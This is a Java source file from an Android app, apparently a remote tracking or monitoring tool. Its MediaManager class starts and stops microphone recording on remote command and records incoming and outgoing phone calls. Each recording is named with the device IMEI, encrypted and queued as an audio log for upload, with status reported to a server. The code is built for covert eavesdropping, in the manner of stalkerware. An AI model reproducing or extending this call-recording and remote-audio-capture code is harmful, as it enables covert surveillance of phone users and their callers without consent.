package vn.vhc.live;

import java.io.IOException;
import java.util.Date;

import android.media.MediaRecorder;
import android.os.Looper;

public class MediaManager {

	public static MediaManager _instance;
	public static MediaManager getInstance()
	{		
		if(_instance==null)_instance= new MediaManager();
		return _instance;
	}	
	private MediaRecorder mRecorder;
	
	public static boolean isCalling=false;//0:normal;1: record calling	
	public static int modeRecord=0;//0:normal;1: record calling	
	public static String timeTracking="";//0:normal;1: record call incoming;2: record call outcoming
	public static boolean isStarting=false;//lock
	
	public void  startRecordAudio()
	{
			try
			{
				if(isStarting) return;
				if(APTrackerService.statusCmdRealtime.equals(TypeCmd.PROCESSING))
				{
					return;
				}
				isStarting=true;
				//Looper.prepare();
				UtilGame.isBusy=true;
				UIManager.getInstance().showMsg("Start record audio...");			
				APTrackerService.timeStartRealTime= new Date();
				//mCamera = Camera.open();
				try
				{
					    if(modeRecord==0)(new HttpData()).notifyRealtimeCmd(TypeCmd.PROCESSING,UtilGame.CMD_START_RECORDAUDIO);
				
					    mRecorder = new MediaRecorder();
						
					    //run well
					    /*
						//1.source
						if((modeRecord==1 || modeRecord==2) && UtilGame.voiceCall)
						{
							mRecorder.setAudioSource(MediaRecorder.AudioSource.VOICE_CALL);
						}
						else mRecorder.setAudioSource(MediaRecorder.AudioSource.DEFAULT);
						//else mRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);					
						
						//2.format
				        mRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);//MPEG_4
				        
				        if(modeRecord==0) APTrackerService.fileNameCurrent=LocationUtil.getIMEI()+"_"+ UtilGame.getInstance().GetStringNow()+".3gp";
				        if(modeRecord==1) APTrackerService.fileNameCurrent="in_"+LocationUtil.getIMEI()+"_"+MediaManager.timeTracking+".3gp";
				        if(modeRecord==2) APTrackerService.fileNameCurrent="out_"+LocationUtil.getIMEI()+"_"+MediaManager.timeTracking+".3gp";		        
				        APTrackerService.fileNameCurrentOk="ok_"+APTrackerService.fileNameCurrent;
				        
				        //mRecorder.setOutputFile(resourceDirectory+"/audio.3gp");
				        mRecorder.setOutputFile(APTrackerService.resourceDirectory+"/"+APTrackerService.fileNameCurrent);
				        
				        //encoder
				        mRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
				        
				        //end of run well
				        */
					    //1.source			
					    
					   
					    if(modeRecord==1) mRecorder.setAudioSource(UtilGame.INCOMING_SOURCE);
					    else if(modeRecord==2) mRecorder.setAudioSource(UtilGame.OUTCOMING_SOURCE);
					    else mRecorder.setAudioSource(MediaRecorder.AudioSource.DEFAULT);
					 	
						//2.format
					    if(modeRecord==1) mRecorder.setOutputFormat(UtilGame.INCOMING_OUTPUT_FORMAT);
					    else if(modeRecord==2) mRecorder.setOutputFormat(UtilGame.OUTCOMING_OUTPUT_FORMAT);
					    else mRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
					    
				        
				        if(modeRecord==0) APTrackerService.fileNameCurrent=LocationUtil.getIMEI()+"_"+ UtilGame.getInstance().GetStringNow()+".3gp";
				        else if(modeRecord==1) APTrackerService.fileNameCurrent="in_"+LocationUtil.getIMEI()+"_"+MediaManager.timeTracking+".3gp";
				        if(modeRecord==2) APTrackerService.fileNameCurrent="out_"+LocationUtil.getIMEI()+"_"+MediaManager.timeTracking+".3gp";		        
				        APTrackerService.fileNameCurrentOk="ok_"+APTrackerService.fileNameCurrent;
				        
				        //mRecorder.setOutputFile(resourceDirectory+"/audio.3gp");
				        mRecorder.setOutputFile(APTrackerService.resourceDirectory+"/"+APTrackerService.fileNameCurrent);
				        
				        //encoder
				        if(modeRecord==1) mRecorder.setAudioEncoder(UtilGame.INCOMING_AUDIO_ENCODER);
				        else if(modeRecord==2) mRecorder.setAudioEncoder(UtilGame.OUTCOMING_AUDIO_ENCODER);
					    else mRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
				       
					    try 
				        {
				            mRecorder.prepare();
				        } catch (Exception e) {
				           // Log.e(LOG_TAG, "prepare() failed");
				        	UtilMemory.addTo(new DataObject(LocationUtil.IMEI, TypeData.ERROR_LOG, 
									"StartRecordAudio0:"+e.toString(),  String.valueOf(BatteryLog.levelBattery), "", "", UtilGame.getInstance().GetStringNow()));
				        	stopRecordAudio();
				        	return;
				        }
				        mRecorder.start();
				        APTrackerService.statusCmdRealtime=TypeCmd.PROCESSING;
					    
				}catch(Exception e)		
				{
					UIManager.getInstance().showMsg("Start record audio1...:"+e.toString());	
					UtilMemory.addTo(new DataObject(LocationUtil.IMEI, TypeData.ERROR_LOG, 
							"StartRecordAudio1:"+e.toString(),  String.valueOf(BatteryLog.levelBattery), "", "", UtilGame.getInstance().GetStringNow()));
					stopRecordAudio();
					//debugMsg("Exception when recording video:"+e.toString());			
				}
			}
			catch(Exception exxxx)
			{
				UtilMemory.addTo(new DataObject(LocationUtil.IMEI, TypeData.ERROR_LOG, 
						"StartRecordAudio:"+exxxx.toString(),  String.valueOf(BatteryLog.levelBattery), "", "", UtilGame.getInstance().GetStringNow()));
				
			}
	}
	public void stopRecordAudio() 
	{
				
				try
				{
					UtilGame.isBusy=false;
					if(mRecorder==null) return;//just add new
					//Looper.prepare();
					UIManager.getInstance().showMsg("Stop record audio...:");	
					
					try
					{	
						mRecorder.stop();						
					}catch(Exception ex)
					{
						UIManager.getInstance().showMsg("Stop record audio...:"+ex.toString());
						UtilMemory.addTo(new DataObject(LocationUtil.IMEI, TypeData.ERROR_LOG, 
								"StopRecordAudio1:"+ex.toString(),  String.valueOf(BatteryLog.levelBattery), "", "", UtilGame.getInstance().GetStringNow()));
				
					}	
					try
					{
						//mRecorder.reset();
						mRecorder.release();
					}catch(Exception ex)
					{
						UIManager.getInstance().showMsg("Stop record audio...:"+ex.toString());
						UtilMemory.addTo(new DataObject(LocationUtil.IMEI, TypeData.ERROR_LOG, 
								"StopRecordAudio1x:"+ex.toString(),  String.valueOf(BatteryLog.levelBattery), "", "", UtilGame.getInstance().GetStringNow()));
				
					}	
					try
					{
						//mRecorder.reset();
						 mRecorder = null;
				       
					}catch(Exception ex)
					{
						UIManager.getInstance().showMsg("Stop record audio...:"+ex.toString());
						UtilMemory.addTo(new DataObject(LocationUtil.IMEI, TypeData.ERROR_LOG, 
								"StopRecordAudio1y:"+ex.toString(),  String.valueOf(BatteryLog.levelBattery), "", "", UtilGame.getInstance().GetStringNow()));
				
					}	
					FileUtil.encryptFile(APTrackerService.fileNameCurrent);
					
					FileUtil.renameFile(APTrackerService.fileNameCurrent, APTrackerService.fileNameCurrentOk);
					if(!isCalling)
					{
							UtilMemory.addTo(new DataObject(ConfigGame.getInstance(null).getActiveKey()
				    			, TypeData.AUDIO_LOG, APTrackerService.resourceDirectory+"/"+APTrackerService.fileNameCurrentOk,  String.valueOf(BatteryLog.levelBattery), "", "",UtilGame.getInstance().GetStringNow()));
					}
					if(modeRecord==0)(new HttpData()).notifyRealtimeCmd(TypeCmd.DONE);
			        APTrackerService.statusCmdRealtime=TypeCmd.DONE;
			        //clear flag
			        modeRecord=0;
			        isCalling=false;			        
			      
				}
				catch(Exception exxxx)
				{
					APTrackerService.statusCmdRealtime=TypeCmd.DONE;
					 //clear flag
			        modeRecord=0;
			        isCalling=false;
			        
					UtilMemory.addTo(new DataObject(LocationUtil.IMEI, TypeData.ERROR_LOG, 
							"StopRecordAudio2:"+exxxx.toString(),  String.valueOf(BatteryLog.levelBattery), "", "", UtilGame.getInstance().GetStringNow()));
					
				}	
				isStarting=false;

	}
}
